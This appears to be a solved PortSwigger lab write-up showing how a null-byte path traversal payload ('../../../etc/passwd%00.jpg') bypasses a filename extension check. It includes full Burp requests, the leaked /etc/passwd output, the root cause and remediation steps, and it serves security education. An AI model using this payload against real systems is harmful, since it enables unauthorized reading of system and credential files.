# File Path Traversal — Validation of File Extension with Null Byte Bypass

**PortSwigger Web Security Academy** | Topic: Path Traversal | Difficulty: Practitioner
**Status:** ✅ Solved

---

## Lab Description

This lab contains a path traversal vulnerability in the display of product images. The application **validates that the supplied filename ends with the expected file extension** (e.g. `.jpg`), which normally prevents traversal payloads that don't end in an image extension.

**Objective:** Retrieve the contents of `/etc/passwd`.

---

## Vulnerability Overview

Requiring a filename to end in `.jpg`/`.png` looks like a reasonable check, but it validates the **string**, not what the underlying filesystem API actually opens. Some server-side languages/frameworks (particularly older PHP running on top of C string-handling APIs) treat a **null byte** (`%00` when URL-decoded to the raw `0x00` byte) as a string terminator at the OS/filesystem layer, even though the byte is just another character to the application's own string-validation logic.

That mismatch creates the bypass:

```
../../../etc/passwd%00.jpg
```

- The **application-level check** sees the full string, notices it ends in `.jpg`, and passes it.
- The **filesystem API**, when it receives the decoded bytes, stops reading the path at the null byte — so it opens `../../../etc/passwd` and never sees the trailing `.jpg` at all.

The extension requirement is satisfied on paper while being completely ignored in practice.

---

## Methodology

### 1. Identify the vulnerable parameter
Burp's Proxy history confirms the familiar pattern — product images are requested via:

```
GET /image?filename=56.jpg
```

### 2. Intercept and send to Repeater
The image request was intercepted in Burp Proxy and sent to **Repeater**.

### 3. Confirm baseline behaviour
The unmodified request:

```http
GET /image?filename=56.jpg HTTP/2
Host: 0a81003303e0262e806db7aa00fe0006.web-security-academy.net
Cookie: session=iREr4Xm29WYhxMzcd0AdfxyESdVphibR
```

returns a normal `200 OK` with binary JPEG data, confirming the endpoint behaves as expected for valid input.

### 4. Bypass the extension check with a null byte
The `filename` parameter was set to a traversal payload with an embedded, URL-encoded null byte immediately before a fake `.jpg` extension — satisfying the extension check textually while the null byte truncates the path before the filesystem ever reaches it:

```http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0a81003303e0262e806db7aa00fe0006.web-security-academy.net
Cookie: session=iREr4Xm29WYhxMzcd0AdfxyESdVphibR
```

### 5. Result

The server returned a `200 OK` with the contents of `/etc/passwd`:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

The lab was marked **Solved**.

---

## Root Cause

The application validates the filename's required extension by inspecting the **full string as the application sees it**, but the underlying file-read call interprets a null byte as end-of-string. Since the application-level check and the OS-level file-open call don't agree on where the "filename" actually ends, an attacker can satisfy the check with a suffix that the filesystem never actually processes.

*Note: this bypass depends on the underlying platform/runtime treating `\0` as a string terminator — it doesn't work universally against every language or filesystem API, but is a classic and still-encountered pattern, especially in legacy stacks.*

---

## Evidence

| Step | Screenshot |
|---|---|
| Lab in "Not solved" state before the attack | `screenshots/01-lab-not-solved.png` |
| Burp Proxy intercept showing normal `filename=56.jpg` image requests | `screenshots/02-burp-proxy-intercept.png` |
| Repeater baseline request — normal `filename=56.jpg` returning a valid JPEG | `screenshots/03-baseline-request-normal-image.png` |
| Repeater request with `filename=../../../etc/passwd%00.jpg` disclosing the file | `screenshots/04-repeater-null-byte-bypass.png` |
| Lab in "Solved" state after the attack | `screenshots/05-lab-solved.png` |

---

## Remediation

- Don't rely on a suffix/extension check as a security control — validate the **fully resolved, canonical path**, not just the string the client sent.
- Canonicalize the path (resolve `../` sequences and strip/reject embedded null bytes) **before** any validation logic runs, and again immediately before the file is opened.
- Reject filenames containing null bytes or other control characters outright.
- Prefer allowlisting a fixed set of valid file identifiers over trusting any part of a client-supplied filename, extension included.
- Keep runtime/language versions current — this specific null-byte string-termination behaviour has been patched out of most modern language runtimes, but legacy or misconfigured stacks remain exposed.

---

## References

- [PortSwigger Web Security Academy – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- CWE-158: Improper Neutralization of Null Byte or NUL Character
